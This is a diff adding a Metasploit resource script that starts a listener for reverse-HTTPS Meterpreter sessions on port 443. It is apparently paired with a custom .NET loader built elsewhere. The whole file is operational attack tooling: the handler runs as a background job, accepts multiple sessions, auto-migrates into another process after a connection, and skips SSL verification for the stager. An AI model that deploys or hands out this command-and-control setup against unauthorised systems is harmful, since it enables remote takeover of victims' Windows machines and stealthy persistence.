@@ -1,0 +1,14 @@
+# handler.rc — multi/handler for the custom .NET loader
+# Load with:  msfconsole -q -r handler.rc
+# Edit LHOST/LPORT/PAYLOAD to match what you built with build.sh
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set EXITFUNC thread
+set ExitOnSession false
+set AutoRunScript post/windows/manage/migrate
+set HandlerSSLCert ""
+set StagerVerifySSLCert false
+exploit -j -z
